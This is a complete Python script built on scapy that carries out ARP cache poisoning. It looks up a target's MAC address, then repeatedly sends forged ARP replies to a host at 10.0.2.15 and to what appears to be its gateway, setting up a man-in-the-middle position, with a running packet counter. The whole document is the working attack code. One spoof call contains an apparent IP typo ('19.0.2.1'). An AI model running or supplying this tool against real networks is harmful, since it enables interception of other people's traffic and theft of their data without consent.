from os import supports_follow_symlinks
import scapy.all as scapy
import time

from scapy.sendrecv import send


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcat = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_reques_broadcast = broadcat/arp_request
    # VERBOSE IS OFF DETAIL WILL NOT BE DISPLAYED
    answered_list = scapy.srp(arp_reques_broadcast,
                              timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet,verbose=False)

sent_packet_count = 0
while True:
    spoof("10.0.2.15", "19.0.2.1")
    spoof("10.0.2.1", "10.0.2.15")
    sent_packet_count +=2
    print("Sent two packets: " + str(sent_packet_count))
    time.sleep(2)